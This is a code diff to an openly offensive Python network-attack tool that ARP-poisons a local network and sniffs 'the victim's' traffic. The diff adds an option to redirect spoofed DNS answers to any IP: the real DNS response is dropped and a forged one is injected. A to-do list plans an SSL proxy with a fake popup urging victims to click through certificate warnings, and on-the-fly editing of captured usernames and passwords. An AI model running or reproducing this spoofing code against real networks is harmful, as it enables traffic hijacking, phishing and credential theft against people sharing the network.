@@ -11,6 +11,13 @@ Prerequisites:	Linux
 					twisted
 
 Note: 			This script flushes iptables before and after usage.
+
+To do:			Add karma MITM technique
+				Add SSL proxy for self-signed cert, and make the script force a single JS popup saying there's a temporary problem with SSL validation and to just click through
+				Add anticaching (just edit the headers)
+				Replace wget with python requests library
+				Ability to add option which will add a delay, allowing user to modify HTML/email/irc/usernames and passwords on the fly (how much interest is there in this?)
+
 '''
 __author__ = 'Dan McInerney'
 __license__ = 'BSD'
@@ -62,6 +69,7 @@ def parse_args():
 	parser.add_argument("-na", "--nmapaggressive", help="Aggressively scan the target for open ports and services in the background. Output to ip.add.re.ss.log.txt where ip.add.re.ss is the victim's IP.", action="store_true")
 	parser.add_argument("-n", "--nmap", help="Scan the target for open ports prior to starting to sniffing their packets.", action="store_true")
 	parser.add_argument("-i", "--interface", help="Choose the interface to use. Default is the first one that shows up in `ip route`.")
+	parser.add_argument("-r", "--redirectto", help="Must be used with -dns DOMAIN option. Redirects the victim to the IP in this argument when they visit the domain in the -dns DOMAIN option")
 	parser.add_argument("-rip", "--routerip", help="Set the router IP; by default the script with attempt a few different ways of getting this so this option hopefully won't be necessary")
 	parser.add_argument("-rmac", "--routermac", help="Set the router MAC; by default the script with attempt a few different ways of getting this so this option hopefully won't be necessary")
 	parser.add_argument("-pcap", "--pcap", help="Parse through a pcap file")
@@ -163,10 +171,9 @@ class Parser():
 			if pkt.haslayer(DNSQR):
 				dport = pkt[UDP].dport
 				sport = pkt[UDP].sport
-				localIP = [x[4] for x in scapy.all.conf.route.routes if x[2] != '0.0.0.0'][0]
 				if dport == 53 or sport == 53:
 					dns_layer = pkt[DNS]
-					self.dnsspoof(dns_layer, IP_src, IP_dst, sport, dport, localIP, payload)
+					self.dnsspoof(dns_layer, IP_src, IP_dst, sport, dport, payload)
 
 	def get_user_agent(self, header_lines):
 		for h in header_lines:
@@ -686,16 +693,22 @@ class Parser():
 			logger.write('[!] Decoded:'+decoded+'\n')
 
 	# Spoof DNS for a specific domain to point to your machine
-	def dnsspoof(self, dns_layer, IP_src, IP_dst, sport, dport, localIP, payload):
+	def dnsspoof(self, dns_layer, IP_src, IP_dst, sport, dport, payload):
 		if self.args.dnsspoof:
-			if self.args.dnsspoof in dns_layer.qd.qname:
-				logger.write('[+] DNS request for '+self.args.dnsspoof+' found; dropping packet and injecting spoofed one to '+localIP+'\n')
-				payload.set_verdict(nfqueue.NF_DROP)
-				logger.write('[+] Dropped real DNS response. Injecting the spoofed packet sending victim to '+localIP+'\n')
-				p = IP(dst=IP_src, src=IP_dst)/UDP(dport=sport, sport=dport)/DNS(id=dns_layer.id, qr=1, aa=1, qd=dns_layer.qd, an=DNSRR(rrname=dns_layer.qd.qname, ttl=10, rdata=localIP))
-				send(p)
-				print G+'[!] Sent spoofed packet for '+W+self.args.dnsspoof
-				logger.write('[!] Sent spoofed packet for '+self.args.dnsspoof+'\n')
+			if self.args.dnsspoof in dns_layer.qd.qname and not self.args.redirectto:
+				localIP = [x[4] for x in scapy.all.conf.route.routes if x[2] != '0.0.0.0'][0]
+				self.dnsspoof_actions(dns_layer, IP_src, IP_dst, sport, dport, payload, localIP)
+			elif self.args.dnsspoof in dns_layer.qd.qname and self.args.redirectto:
+				self.dnsspoof_actions(dns_layer, IP_src, IP_dst, sport, dport, payload, self.args.redirectto)
+
+	def dnsspoof_actions(self, dns_layer, IP_src, IP_dst, sport, dport, payload, rIP):
+		print G+'[+] DNS request for '+W+self.args.dnsspoof+G+' found; dropping packet and injecting spoofed one redirecting to '+W+rIP
+		logger.write('[+] DNS request for '+self.args.dnsspoof+' found; dropping packet and injecting spoofed one redirecting to '+rIP+'\n')
+		payload.set_verdict(nfqueue.NF_DROP)
+		p = IP(dst=IP_src, src=IP_dst)/UDP(dport=sport, sport=dport)/DNS(id=dns_layer.id, qr=1, aa=1, qd=dns_layer.qd, an=DNSRR(rrname=dns_layer.qd.qname, ttl=10, rdata=rIP))
+		send(p)
+		print G+'[!] Sent spoofed packet for '+W+self.args.dnsspoof+G+' to '+W+rIP
+		logger.write('[!] Sent spoofed packet for '+self.args.dnsspoof+' to '+rIP+'\n')
 
 #Wrap the nfqueue object in an IReadDescriptor and run the process_pending function in a .doRead() of the twisted IReadDescriptor
 class Queued(object):
@@ -995,9 +1008,7 @@ def main(args):
 				print "[-] Router did not respond to ARP request for MAC, attempting to pull the MAC from the ARP cache"
 				arpcache = Popen(['/usr/sbin/arp', '-n'], stdout=PIPE, stderr=DN)
 				split_lines = arpcache.communicate()[0].splitlines()
-				print split_lines[1],'\n'
 				arpoutput = split_lines[1].split()
-				print arpoutput,'\n'
 				routerMAC = arpoutput[2]
 				print "[*] Router MAC: " + routerMAC
 				logger.write("[*] Router MAC: "+routerMAC+'\n')
